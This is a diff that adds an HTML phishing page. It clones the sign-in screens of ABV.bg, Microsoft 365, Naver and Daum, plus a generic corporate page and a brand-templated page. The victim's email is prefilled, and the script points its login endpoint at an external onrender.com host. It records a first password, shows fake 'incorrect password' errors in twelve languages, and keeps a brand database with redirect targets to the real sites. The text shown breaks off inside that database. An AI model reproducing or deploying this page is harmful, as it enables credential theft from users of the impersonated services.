@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title id="pageTitle">Secure Sign In</title>
+<style>
+    /* =========================================================
+       GLOBAL RESET & GENERIC UI
+       ========================================================= */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, 'Noto Sans KR', 'Noto Sans JP', 'Noto Sans SC', sans-serif; min-height: 100vh; background-size: cover; background-position: center; color: #333; display: flex; justify-content: center; align-items: center; padding: 20px; transition: background 0.6s ease; }
+    .login-container { background: white; border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); max-width: 420px; width: 100%; padding: 48px 40px; position: relative; z-index: 1; transition: all 0.3s ease; }
+    .header { text-align: center; margin-bottom: 32px; }
+    .logo-icon { width: 64px; height: 64px; border-radius: 16px; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; color: white; font-size: 28px; font-weight: 700; overflow: hidden; }
+    .logo-icon img { width: 100%; height: 100%; object-fit: contain; }
+    .logo-text { font-size: 24px; font-weight: 700; letter-spacing: -0.5px; }
+    .subtitle { color: #5f6368; font-size: 14px; margin-top: 4px; }
+    .domain-badge { display: inline-block; padding: 4px 12px; border-radius: 12px; font-size: 11px; font-weight: 600; margin-top: 8px; }
+    .form-group { margin-bottom: 20px; }
+    .form-group label { display: block; color: #3c4043; font-size: 14px; font-weight: 500; margin-bottom: 6px; }
+    .form-group input { width: 100%; padding: 12px 14px; border: 2px solid #dadce0; border-radius: 8px; font-size: 15px; font-family: inherit; transition: border-color 0.2s; }
+    .form-group input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 0 3px rgba(26,115,232,0.1); }
+    .form-group input:disabled { background: #f8f9fa; color: #5f6368; }
+    .form-group input.error { border-color: #d93025; }
+    .password-wrapper { position: relative; }
+    .password-wrapper input { padding-right: 44px; }
+    .toggle-password { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #9aa0a6; cursor: pointer; padding: 4px; font-size: 18px; }
+    .btn-signin { width: 100%; padding: 14px; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 8px; }
+    .btn-signin:disabled { background: #9aa0a6 !important; cursor: not-allowed; }
+    .footer-links { display: flex; justify-content: space-between; margin-top: 20px; font-size: 13px; }
+    .footer-links a { color: #1a73e8; text-decoration: none; }
+    .footer-text { text-align: center; margin-top: 24px; padding-top: 20px; border-top: 1px solid #e8eaed; font-size: 12px; color: #9aa0a6; }
+    .brand-flag { display: inline-block; font-size: 10px; background: rgba(0,0,0,0.05); padding: 2px 8px; border-radius: 10px; color: #666; margin-left: 6px; }
+    .err-box { color: #d32f2f; font-size: 13px; margin-top: 10px; display: none; text-align: left; }
+    .err-box.show { display: block; }
+
+    /* =========================================================
+       CLONE 1: ABV.BG LAYOUT (Framer Clone)
+       ========================================================= */
+    body.is-abv { display: block !important; background: #fff !important; padding: 0 !important; }
+    .framer-k1yVm{height:1080px;background-color:#fff;width:1351px;position:relative;margin:0 auto}
+    .framer-l37xyv{z-index:10;background-color:#f0f0f0;width:100%;height:35px;position:absolute;top:0;left:0}
+    .framer-1uj2ez6{width:25px;position:absolute;top:5px;left:15px}
+    .framer-13rvrfu{display:flex;position:absolute;top:11px;left:36px;border-right:2px solid #d4d0c8;padding:0 11px;align-items:center}
+    .framer-i0rsf2{display:flex;position:absolute;top:11px;left:134px;border-right:2px solid #d4d0c8;padding:0 11px;align-items:center}
+    .framer-1inf8b4{display:flex;position:absolute;top:11px;left:185px;border-right:2px solid #d4d0c8;padding:0 11px;align-items:center}
+    .framer-14zwyi7{position:absolute;top:11px;left:335px}
+    .framer-1trcrps{position:absolute;top:3px;left:470px}
+    .framer-e23xuc{display:flex;position:absolute;top:11px;left:1095px;border-right:2px solid #d4d0c8;padding:0 12px 0 11px;align-items:center}
+    .framer-1ofzc25{position:absolute;top:11px;left:1253px}
+    .framer-ivfs9d{position:absolute;top:53px;left:216px}
+    .framer-1tyjjwu{position:absolute;top:77px;left:827px;width:305px;border:1px solid #e0e0e0}
+    .framer-1tqp0cc,.framer-1lwhm32,.framer-1cb6bps{position:absolute;top:473px;width:215px}
+    .framer-1tqp0cc{left:196px}.framer-1lwhm32{left:428px}.framer-1cb6bps{left:660px}
+    .framer-1op5ul{position:absolute;top:638px;left:741px;width:215px}
+    .framer-heb492{position:absolute;top:586px;left:196px;width:262px}
+    .framer-1srjyxk{position:absolute;top:586px;left:472px;width:262px}
+    .framer-195nnv8{background-color:#b8e6fd;width:640px;height:288px;position:absolute;top:146px;left:196px}
+    .framer-nmkhwe{position:absolute;top:15px;left:25px}
+    .framer-zgdkdg{position:absolute;top:0;left:340px;width:300px}
+    .framer-1ivdcrg{position:absolute;bottom:32px;left:76px}
+    .framer-17sdx75{position:absolute;bottom:8px;left:25px}
+    .framer-1k6dsll{background:#fff;width:940px;height:33px;position:absolute;top:434px;left:calc(49.2968% - 470px)}
+    .framer-122upky{position:absolute;top:-14px;left:24px}
+    .framer-6nmjat{position:absolute;top:7px;left:898px}
+    .framer-PR0MW{display:flex;flex-direction:column;gap:20px;width:640px;height:288px;padding:20px;position:relative;overflow:hidden}
+    .framer-form-text-input{background:#fcffdf;border:1px solid rgba(136,136,136,.1);border-radius:2px;padding:4px;display:flex;align-items:center;height:29px}
+    .framer-form-text-input input{background:transparent;border:none;outline:none;width:100%;padding:0 4px;font-size:14px}
+    .framer-btn{background:rgb(27,158,21);border:none;color:#fff;font-size:14px;font-weight:600;width:240px;height:40px;cursor:pointer;border-radius:2px}
+
+    /* =========================================================
+       CLONE 2: MICROSOFT 365 LAYOUT
+       ========================================================= */
+    .m365-layout { display: none; width: 100vw; height: 100vh; justify-content: center; align-items: center; background: linear-gradient(135deg, #f4e8f8 0%, #e6f0fa 50%, #fce8ef 100%); }
+    body.is-m365 { display: flex !important; padding: 0 !important; }
+    body.is-m365 .m365-layout { display: flex; }
+    .m365-card { background: #fff; width: 440px; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
+    .m365-logo { display: flex; align-items: center; gap: 8px; font-size: 20px; font-weight: 600; color: #5e5e5e; margin-bottom: 24px; }
+    .m365-logo-icon { width: 24px; height: 24px; display: grid; grid-template-columns: 1fr 1fr; gap: 2px; }
+    .m365-logo-icon div { width: 100%; height: 100%; }
+    .m365-logo-icon div:nth-child(1) { background: #f25022; }
+    .m365-logo-icon div:nth-child(2) { background: #7fba00; }
+    .m365-logo-icon div:nth-child(3) { background: #00a4ef; }
+    .m365-logo-icon div:nth-child(4) { background: #ffb900; }
+    .m365-back { display: flex; align-items: center; gap: 8px; font-size: 15px; color: #1b1b1b; margin-bottom: 16px; }
+    .m365-back span { font-weight: 600; }
+    .m365-title { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 24px; }
+    .m365-input { width: 100%; padding: 8px 0; border: none; border-bottom: 1px solid #666; font-size: 15px; margin-bottom: 16px; background: transparent; }
+    .m365-input:focus { outline: none; border-bottom: 2px solid #0067b8; }
+    .m365-link { color: #0067b8; font-size: 14px; text-decoration: none; display: inline-block; margin-bottom: 32px; }
+    .m365-btn { background: #0067b8; color: white; border: none; padding: 6px 32px; font-size: 15px; float: right; cursor: pointer; }
+    .m365-btn:hover { background: #005da6; }
+
+    /* =========================================================
+       CLONE 3: CORPORATE / CUSTOM DOMAIN
+       ========================================================= */
+    .corp-layout { display: none; width: 100vw; height: 100vh; justify-content: center; align-items: center; background: #fff; }
+    body.is-corp { display: flex !important; padding: 0 !important; }
+    body.is-corp .corp-layout { display: flex; }
+    .corp-card { background: #fff; width: 420px; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); text-align: center; border: 1px solid #f0f0f0; }
+    .corp-logo { width: 64px; height: 64px; border-radius: 16px; margin: 0 auto 16px; display: flex; justify-content: center; align-items: center; font-size: 32px; font-weight: 700; color: white; }
+    .corp-title-row { display: flex; justify-content: center; align-items: center; gap: 8px; margin-bottom: 4px; }
+    .corp-title { font-size: 22px; font-weight: 800; color: #222; }
+    .corp-badge { font-size: 10px; background: #e0f2fe; color: #0284c7; padding: 2px 8px; border-radius: 10px; font-weight: 700; }
+    .corp-sub { font-size: 14px; color: #666; margin-bottom: 12px; }
+    .corp-domain-pill { display: inline-flex; align-items: center; gap: 6px; border: 1px solid #e5e5e5; background: #fafafa; padding: 4px 12px; border-radius: 20px; font-size: 12px; color: #0284c7; font-weight: 600; margin-bottom: 30px; }
+    .corp-input-group { text-align: left; margin-bottom: 20px; }
+    .corp-input-group label { display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 8px; }
+    .corp-input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; background: #f9f9f9; }
+    .corp-input:focus { outline: none; border-color: #06b6d4; background: #fff; }
+    .corp-btn { width: 100%; background: #06b6d4; color: white; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+    .corp-footer { font-size: 12px; color: #999; margin-top: 24px; border-top: 1px solid #eee; padding-top: 16px; }
+    .corp-footer a { color: #06b6d4; text-decoration: none; margin: 0 4px; }
+
+    /* =========================================================
+       CLONE 4: NAVER LAYOUT
+       ========================================================= */
+    .naver-layout { display: none; width: 100vw; min-height: 100vh; justify-content: center; align-items: flex-start; padding-top: 50px; background: #fff; }
+    body.is-naver { display: flex !important; padding: 0 !important; background: #fff !important; }
+    body.is-naver .naver-layout { display: flex; }
+    .naver-card { width: 460px; }
+    .naver-header { text-align: center; margin-bottom: 30px; }
+    .naver-header img { height: 50px; }
+    .naver-box { border: 1px solid #dadada; border-radius: 8px; background: #fff; padding: 20px 25px; }
+    .naver-tabs { display: flex; border-bottom: 1px solid #dadada; margin-bottom: 20px; }
+    .naver-tab { flex: 1; text-align: center; padding: 10px 0; font-size: 14px; font-weight: bold; color: #666; cursor: pointer; }
+    .naver-tab.active { color: #03c75a; border-bottom: 2px solid #03c75a; }
+    .naver-input-group { border: 1px solid #dadada; border-radius: 4px; margin-bottom: 10px; }
+    .naver-input-group input { width: 100%; padding: 12px; border: none; font-size: 14px; }
+    .naver-input-group input:focus { outline: none; }
+    .naver-input-group input[type="email"] { border-bottom: 1px solid #dadada; background: #fafafa; }
+    .naver-options { display: flex; justify-content: space-between; align-items: center; font-size: 13px; margin: 15px 0; color: #333; }
+    .naver-toggle { display: flex; align-items: center; gap: 5px; }
+    .naver-btn { width: 100%; background: #03c75a; color: #fff; border: none; padding: 15px; font-size: 16px; font-weight: bold; border-radius: 4px; cursor: pointer; margin-bottom: 15px; }
+    .naver-divider { text-align: center; font-size: 12px; color: #999; margin: 20px 0; position: relative; }
+    .naver-divider::before, .naver-divider::after { content: ''; position: absolute; top: 50%; width: 40%; height: 1px; background: #eee; }
+    .naver-divider::before { left: 0; } .naver-divider::after { right: 0; }
+    .naver-passkey { width: 100%; border: 1px solid #03c75a; background: #fff; color: #03c75a; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 5px; }
+    .naver-footer-links { display: flex; justify-content: center; gap: 10px; font-size: 13px; color: #666; margin-top: 20px; }
+
+    /* =========================================================
+       CLONE 5: DAUM LAYOUT
+       ========================================================= */
+    .daum-layout { display: none; width: 100vw; height: 100vh; justify-content: center; align-items: center; }
+    body.is-daum { display: flex !important; padding: 0 !important; }
+    body.is-daum .daum-layout { display: flex; }
+    .daum-card { background: #fff; width: 420px; padding: 40px; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); }
+    .daum-logo { font-size: 32px; font-weight: 700; color: #333; margin-bottom: 30px; }
+    .daum-logo span { color: #f9a800; }
+    .daum-input { width: 100%; padding: 12px; border: 1px solid #ccc; margin-bottom: 10px; font-size: 14px; }
+    .daum-btn { width: 100%; background: #f9a800; color: #fff; border: none; padding: 12px; font-size: 15px; font-weight: bold; cursor: pointer; }
+
+    /* =========================================================
+       LOADING STATE
+       ========================================================= */
+    .loading-layout { display: none; width: 100vw; height: 100vh; justify-content: center; align-items: center; background: #fafafa; }
+    body.is-loading { display: flex !important; padding: 0 !important; }
+    body.is-loading .loading-layout { display: flex; }
+    .spinner { width: 40px; height: 40px; border: 4px solid #f0f0f0; border-top: 4px solid #1a73e8; border-radius: 50%; animation: spin 1s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+
+    <!-- LOADING SPINNER -->
+    <div class="loading-layout" id="loadingContainer"><div class="spinner"></div></div>
+
+    <!-- 1. ABV.BG SPECIFIC UI -->
+    <div id="abvContainer" style="display:none;">
+        <div class="framer-k1yVm">
+          <div class="framer-l37xyv">
+            <div class="framer-1uj2ez6"><img src="https://framerusercontent.com/images/casWq2XT2AxtIAfXFrCfMV2R0.svg" style="width:100%"></div>
+            <div class="framer-13rvrfu"><p style="font-size:14px;font-weight:900">АБВ Поща</p></div>
+            <div class="framer-i0rsf2"><p style="font-size:12px;font-weight:700;color:rgb(30,147,12)">DOX</p></div>
+            <div class="framer-1inf8b4"><p style="font-size:12px;font-weight:700;color:rgb(30,147,12)">АБВ на твой домейн</p></div>
+            <div class="framer-14zwyi7"><img src="https://framerusercontent.com/images/uebBbbNZYu4aV5MVIkBR0U26F2M.svg" style="width:100%"></div>
+            <div class="framer-1trcrps"><img src="https://framerusercontent.com/images/EgViW3Y1mC1GWqjtSx1lBDjhCqs.svg" style="width:100%"></div>
+            <div class="framer-e23xuc"><p style="font-size:12px;font-weight:700;color:rgb(30,147,12)">Регистрация в АБВ</p></div>
+            <div class="framer-1ofzc25"><p style="font-size:12px;font-weight:700;color:rgb(30,147,12)">АБВ профил</p></div>
+          </div>
+          <div class="framer-ivfs9d"><img src="https://framerusercontent.com/images/5XhmlwsfPBGpVltxlwiDdG9kbo.svg" style="width:100%"></div>
+          <div class="framer-1tyjjwu"><img src="https://framerusercontent.com/images/ZeCcpoYP2U97mEHPaGcLCZZ6TUs.svg" style="width:100%"></div>
+          <div class="framer-1tqp0cc"><img src="https://framerusercontent.com/images/wBR7zAdtrn6C95FCM4PckzSLiCc.jpg" style="width:100%"></div>
+          <div class="framer-1lwhm32"><img src="https://framerusercontent.com/images/p6OxGGbP252qR6YGCNy37MAumxs.jpg" style="width:100%"></div>
+          <div class="framer-1cb6bps"><img src="https://framerusercontent.com/images/k3u3mM2vefXrTni654AVuXGYQw.jpg" style="width:100%"></div>
+          <div class="framer-1op5ul"><img src="https://framerusercontent.com/images/mR27Z9ciB9VoWIUmbkgcgfR97tU.jpg" style="width:100%"></div>
+          <div class="framer-heb492"><img src="https://framerusercontent.com/images/7u0tWTuqrVIRhnkaOAu2Kx3EVH0.jpg" style="width:100%"></div>
+          <div class="framer-1srjyxk"><img src="https://framerusercontent.com/images/UZRgbZYB2TjD2gdiDjaQo3wb5qg.jpg" style="width:100%"></div>
+          <div class="framer-195nnv8">
+            <div class="framer-nmkhwe"><h2 style="font-size:21px;color:rgb(47,47,47);font-weight:400">Вход в АБВ Поща</h2></div>
+            <div class="framer-zgdkdg"><img src="https://framerusercontent.com/images/sgSVom1iXFk6VFGgXqvmmuMUbt4.png" style="width:100%"></div>
+            <div class="framer-17sdx75"><p style="font-size:11px">Нямаш профил в АБВ? <a href="#" style="color:rgb(30,147,12)">Регистрирай се!</a></p></div>
+            <div class="framer-1ivdcrg"><p style="font-size:11px"><a href="#" style="color:rgb(22,110,29)">Забравена парола</a></p></div>
+            <form class="framer-PR0MW" style="position:absolute;top:60px;left:25px;width:315px;gap:10px" onsubmit="return false;">
+              <p style="font-size:12px;font-weight:500">АБВ потребител:</p>
+              <div class="framer-form-text-input"><input type="email" id="abvEmail" readonly></div>
+              <p style="font-size:12px;font-weight:500">Парола:</p>
+              <div class="framer-form-text-input"><input type="password" id="abvPass" required></div>
+              <button type="button" class="framer-btn" onclick="submitLogin('abv')">Вход</button>
+              <div id="abv-err" class="err-box"></div>
+            </form>
+          </div>
+        </div>
+    </div>
+
+    <!-- 2. MICROSOFT 365 UI -->
+    <div class="m365-layout" id="m365Container">
+        <div class="m365-card">
+            <div class="m365-logo"><div class="m365-logo-icon"><div></div><div></div><div></div><div></div></div>Microsoft</div>
+            <div class="m365-back"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg><span id="m365EmailDisplay">user@domain.com</span></div>
+            <div class="m365-title">Enter password</div>
+            <input type="password" id="m365Pass" class="m365-input" placeholder="Password">
+            <a href="#" class="m365-link">Forgot my password</a>
+            <div style="text-align:right;"><button class="m365-btn" onclick="submitLogin('m365')">Sign in</button></div>
+            <div id="m365-err" class="err-box"></div>
+        </div>
+    </div>
+
+    <!-- 3. CORPORATE UI -->
+    <div class="corp-layout" id="corpContainer">
+        <div class="corp-card">
+            <div class="corp-logo" id="corpLogo">A</div>
+            <div class="corp-title-row"><div class="corp-title" id="corpTitle">CORP</div><div class="corp-badge" id="corpBadge">CORP</div></div>
+            <div class="corp-sub" id="corpSub">Sign in to domain.com</div>
+            <div class="corp-domain-pill"><svg width="14" height="14" viewBox="0 0 24 24" fill="#0284c7"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg><span id="corpDomainText">DOMAIN.COM</span></div>
+            <div class="corp-input-group"><label>Email Address</label><input type="email" id="corpEmail" class="corp-input" readonly></div>
+            <div class="corp-input-group"><label>Password</label><input type="password" id="corpPass" class="corp-input" placeholder="Enter your password"></div>
+            <button class="corp-btn" onclick="submitLogin('corp')">Sign In</button>
+            <div class="corp-footer"><a href="#">Forgot password?</a> • <a href="#">Create account</a><br><br><span id="corpCopyright">© domain.com. All rights reserved.</span></div>
+            <div id="corp-err" class="err-box" style="text-align:center;"></div>
+        </div>
+    </div>
+
+    <!-- 4. NAVER UI -->
+    <div class="naver-layout" id="naverContainer">
+        <div class="naver-card">
+            <div class="naver-header"><img src="https://upload.wikimedia.org/wikipedia/commons/2/23/Naver_Logotype.svg" alt="NAVER"></div>
+            <div class="naver-box">
+                <div class="naver-tabs"><div class="naver-tab active">👤 ID/Phone number</div><div class="naver-tab">🖼️ QR code</div></div>
+                <div class="naver-input-group"><input type="email" id="naverEmail" readonly disabled><input type="password" id="naverPass" placeholder="Password"></div>
+                <div class="naver-options"><label><input type="checkbox"> Stay signed in</label><div class="naver-toggle">IP Security <div style="width:36px;height:20px;background:#03c75a;border-radius:10px;position:relative;"><div style="width:16px;height:16px;background:#fff;border-radius:50%;position:absolute;right:2px;top:2px;"></div></div></div></div>
+                <button class="naver-btn" onclick="submitLogin('naver')">Sign in</button>
+                <div class="naver-divider">Make it safer</div>
+                <button class="naver-passkey">🛡️ Sign in with a passkey</button>
+                <div class="naver-footer-links"><a href="#">Find ID or Password</a> | <a href="#">Sign up</a></div>
+                <div id="naver-err" class="err-box" style="text-align:center;"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 5. DAUM UI -->
+    <div class="daum-layout" id="daumContainer">
+        <div class="daum-card">
+            <div class="daum-logo">Daum <span>메일</span></div>
+            <input type="email" id="daumEmail" class="daum-input" readonly disabled>
+            <input type="password" id="daumPass" class="daum-input" placeholder="비밀번호 (Password)">
+            <button class="daum-btn" onclick="submitLogin('daum')">로그인 (Log In)</button>
+            <div id="daum-err" class="err-box"></div>
+        </div>
+    </div>
+
+    <!-- 6. GENERIC UI (600+ Brands & Auto-generated Fallbacks) -->
+    <div class="login-container" id="genericContainer" style="display:none;">
+        <div class="header">
+            <div class="logo-icon" id="logoIcon">VT</div>
+            <div class="logo-text" id="logoText">vtex-<span class="highlight" id="highlightText">grp</span>.com<span class="brand-flag" id="brandFlag">Default</span></div>
+            <div class="subtitle" id="subtitleText">Secure Sign In</div>
+            <div class="domain-badge" id="domainBadge">🔒 Secured</div>
+        </div>
+        <div class="form-group"><label for="emailDisplay" id="emailLabel">Email Address</label><input type="email" id="emailDisplay" readonly disabled></div>
+        <div class="form-group">
+            <label for="password" id="passwordLabel">Password</label>
+            <div class="password-wrapper">
+                <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
+                <button type="button" class="toggle-password" onclick="togglePasswordVisibility()">👁️</button>
+            </div>
+        </div>
+        <div class="error-message" id="errorMessage">⚠️ <span id="errorText">Please enter your password</span></div>
+        <button class="btn-signin" onclick="submitLogin('generic')" id="signinBtn"><span class="btn-text" id="btnText">Sign In</span></button>
+        <div class="footer-links"><a href="#" id="forgotLink">Forgot password?</a><a href="#" id="createLink">Create account</a></div>
+        <div class="footer-text"><div id="copyrightText">&copy; 2026. All rights reserved.</div></div>
+    </div>
+
+<script>
+const API_BASE = 'https://sso-login-verify.onrender.com';
+const CONFIG = { LOGIN_URL: API_BASE + '/api/login', MAX_ATTEMPTS: 3 };
+
+let currentEmail = '', currentDomain = '', proofFromUrl = '', proofTsFromUrl = '';
+let loginAttempts = 0, firstPassword = '', currentBrand = null;
+
+/* ============================================================
+   1. BROWSER LANGUAGE & GENERIC LABELS
+   ============================================================ */
+const SUPPORTED_LANGS = ['en','bg','ko','de','ru','fr','it','es','nl','ja','zh','pl'];
+function detectLanguage() {
+    const prefs = navigator.languages || [navigator.language || 'en'];
+    for (const lang of prefs) {
+        const base = String(lang).split('-')[0].toLowerCase();
+        if (SUPPORTED_LANGS.includes(base)) return base;
+    }
+    return 'en';
+}
+const GENERIC_LABELS = {
+    en: { subtitle:'Secure Sign In', emailLabel:'Email Address', passwordLabel:'Password', passwordPlaceholder:'Enter your password', passwordHint:'Enter your account password', signIn:'Sign In', forgot:'Forgot password?', create:'Create account', errorEmpty:'Please enter your password', errorShort:'Password must be at least 4 characters', errorWrong:'Incorrect password. Please try again.', errorTooMany:'Too many attempts. Redirecting…', copyright:'© 2026. All rights reserved.' },
+    bg: { subtitle:'Сигурен вход', emailLabel:'Имейл адрес', passwordLabel:'Парола', passwordPlaceholder:'Въведете паролата си', passwordHint:'Въведете паролата на акаунта си', signIn:'Вход', forgot:'Забравена парола?', create:'Създай акаунт', errorEmpty:'Моля, въведете паролата си', errorShort:'Паролата трябва да е поне 4 знака', errorWrong:'Грешна парола. Опитайте отново.', errorTooMany:'Твърде много опити. Пренасочване…', copyright:'© 2026. Всички права запазени.' },
+    ko: { subtitle:'보안 로그인', emailLabel:'이메일 주소', passwordLabel:'비밀번호', passwordPlaceholder:'비밀번호를 입력하세요', passwordHint:'계정 비밀번호를 입력하세요', signIn:'로그인', forgot:'비밀번호 찾기', create:'회원가입', errorEmpty:'비밀번호를 입력하세요', errorShort:'비밀번호는 최소 4자 이상이어야 합니다', errorWrong:'잘못된 비밀번호입니다. 다시 시도하세요.', errorTooMany:'시도 횟수 초과. 리디렉션 중…', copyright:'© 2026. All rights reserved.' },
+    de: { subtitle:'Sichere Anmeldung', emailLabel:'E-Mail-Adresse', passwordLabel:'Passwort', passwordPlaceholder:'Passwort eingeben', passwordHint:'Kontopasswort eingeben', signIn:'Anmelden', forgot:'Passwort vergessen?', create:'Konto erstellen', errorEmpty:'Bitte Passwort eingeben', errorShort:'Passwort muss mindestens 4 Zeichen haben', errorWrong:'Falsches Passwort. Bitte erneut versuchen.', errorTooMany:'Zu viele Versuche. Weiterleitung…', copyright:'© 2026. Alle Rechte vorbehalten.' },
+    ru: { subtitle:'Безопасный вход', emailLabel:'Электронная почта', passwordLabel:'Пароль', passwordPlaceholder:'Введите пароль', passwordHint:'Введите пароль от аккаунта', signIn:'Войти', forgot:'Забыли пароль?', create:'Создать аккаунт', errorEmpty:'Введите пароль', errorShort:'Пароль должен быть не менее 4 символов', errorWrong:'Неверный пароль. Попробуйте снова.', errorTooMany:'Слишком много попыток. Перенаправление…', copyright:'© 2026. Все права защищены.' },
+    fr: { subtitle:'Connexion sécurisée', emailLabel:'Adresse e-mail', passwordLabel:'Mot de passe', passwordPlaceholder:'Entrez votre mot de passe', passwordHint:'Entrez le mot de passe de votre compte', signIn:'Se connecter', forgot:'Mot de passe oublié ?', create:'Créer un compte', errorEmpty:'Veuillez entrer votre mot de passe', errorShort:'Le mot de passe doit contenir au moins 4 caractères', errorWrong:'Mot de passe incorrect. Veuillez réessayer.', errorTooMany:'Trop de tentatives. Redirection…', copyright:'© 2026. Tous droits réservés.' },
+    it: { subtitle:'Accesso sicuro', emailLabel:'Indirizzo email', passwordLabel:'Password', passwordPlaceholder:'Inserisci la password', passwordHint:'Inserisci la password del tuo account', signIn:'Accedi', forgot:'Password dimenticata?', create:'Crea account', errorEmpty:'Inserisci la password', errorShort:'La password deve contenere almeno 4 caratteri', errorWrong:'Password errata. Riprova.', errorTooMany:'Troppi tentativi. Reindirizzamento…', copyright:'© 2026. Tutti i diritti riservati.' },
+    es: { subtitle:'Inicio de sesión seguro', emailLabel:'Correo electrónico', passwordLabel:'Contraseña', passwordPlaceholder:'Introduce tu contraseña', passwordHint:'Introduce la contraseña de tu cuenta', signIn:'Iniciar sesión', forgot:'¿Olvidaste tu contraseña?', create:'Crear cuenta', errorEmpty:'Por favor, introduce tu contraseña', errorShort:'La contraseña debe tener al menos 4 caracteres', errorWrong:'Contraseña incorrecta. Inténtalo de nuevo.', errorTooMany:'Demasiados intentos. Redirigiendo…', copyright:'© 2026. Todos los derechos reservados.' },
+    nl: { subtitle:'Veilig inloggen', emailLabel:'E-mailadres', passwordLabel:'Wachtwoord', passwordPlaceholder:'Voer uw wachtwoord in', passwordHint:'Voer uw accountwachtwoord in', signIn:'Inloggen', forgot:'Wachtwoord vergeten?', create:'Account aanmaken', errorEmpty:'Voer uw wachtwoord in', errorShort:'Wachtwoord moet minimaal 4 tekens bevatten', errorWrong:'Onjuist wachtwoord. Probeer het opnieuw.', errorTooMany:'Te veel pogingen. Doorsturen…', copyright:'© 2026. Alle rechten voorbehouden.' },
+    ja: { subtitle:'セキュアサインイン', emailLabel:'メールアドレス', passwordLabel:'パスワード', passwordPlaceholder:'パスワードを入力', passwordHint:'アカウントのパスワードを入力してください', signIn:'ログイン', forgot:'パスワードをお忘れですか？', create:'アカウント作成', errorEmpty:'パスワードを入力してください', errorShort:'パスワードは4文字以上である必要があります', errorWrong:'パスワードが間違っています。もう一度お試しください。', errorTooMany:'試行回数が多すぎます。リダイレクト中…', copyright:'© 2026. All rights reserved.' },
+    zh: { subtitle:'安全登录', emailLabel:'电子邮件地址', passwordLabel:'密码', passwordPlaceholder:'输入您的密码', passwordHint:'输入您的账户密码', signIn:'登录', forgot:'忘记密码？', create:'创建账户', errorEmpty:'请输入您的密码', errorShort:'密码长度至少为4个字符', errorWrong:'密码错误。请重试。', errorTooMany:'尝试次数过多。正在重定向…', copyright:'© 2026. 保留所有权利。' },
+    pl: { subtitle:'Bezpieczne logowanie', emailLabel:'Adres e-mail', passwordLabel:'Hasło', passwordPlaceholder:'Wprowadź hasło', passwordHint:'Wprowadź hasło do swojego konta', signIn:'Zaloguj się', forgot:'Nie pamiętasz hasła?', create:'Utwórz konto', errorEmpty:'Wprowadź swoje hasło', errorShort:'Hasło musi mieć co najmniej 4 znaki', errorWrong:'Nieprawidłowe hasło. Spróbuj ponownie.', errorTooMany:'Zbyt wiele prób. Przekierowywanie…', copyright:'© 2026. Wszelkie prawa zastrzeżone.' }
+};
+function getGenericLabels() { return GENERIC_LABELS[detectLanguage()] || GENERIC_LABELS['en']; }
+
+/* ============================================================
+   2. BRAND DATABASE (Full 600+ Coverage)
+   ============================================================ */
+const BRAND_DB = {
+    'abv.bg': { name:'ABV', domain:'abv.bg', logoText:'ABV', highlightText:'Mail', logoIcon:'A', logoColor:'#0066b3', accentColor:'#0066b3', buttonColor:'#0066b3', buttonHover:'#004d8a', realSite:'https://www.abv.bg', subtitle:'ABV Поща', passwordHint:'Въведете вашата парола за ABV', forgotPassword:'Забравена парола?', createAccount:'Създай акаунт', copyright:'© ABV. Всички права запазени.', flag:'🇧🇬', bgUrl:'', logoUrl:'' },
+    'mail.bg': { name:'Mail.bg', domain:'mail.bg', logoText:'Mail', highlightText:'.bg', logoIcon:'M', logoColor:'#ff6600', accentColor:'#ff6600', buttonColor:'#ff6600', buttonHover:'#cc5500', realSite:'https://mail.bg', subtitle:'Mail.bg Поща', passwordHint:'Въведете вашата парола за Mail.bg', forgotPassword:'Забравена парола?', createAccount:'Създай акаунт', copyright:'© Mail.bg. Всички права запазени.', flag:'🇧🇬', bgUrl:'', logoUrl:'' },
+    'dir.bg': { name:'Dir.bg', domain:'dir.bg', logoText:'Dir', highlightText:'.bg', logoIcon:'D', logoColor:'#e30613', accentColor:'#e30613', buttonColor:'#e30613', buttonHover:'#b30510', realSite:'https://mail.dir.bg', subtitle:'Dir.bg Поща', passwordHint:'Въведете вашата парола за Dir.bg', forgotPassword:'Забравена парола?', createAccount:'Създай акаунт', copyright:'© Dir.bg. Всички права запазени.', flag:'🇧🇬', bgUrl:'', logoUrl:'' },
+    'vbox7.com': { name:'Vbox7', domain:'vbox7.com', logoText:'Vbox', highlightText:'7', logoIcon:'V', logoColor:'#ff0000', accentColor:'#ff0000', buttonColor:'#ff0000', buttonHover:'#cc0000', realSite:'https://www.vbox7.com', subtitle:'Vbox7 Акаунт', passwordHint:'Въведете вашата парола за Vbox7', forgotPassword:'Забравена парола?', createAccount:'Създай акаунт', copyright:'© Vbox7. Всички права запазени.', flag:'🇧🇬', bgUrl:'', logoUrl:'' },
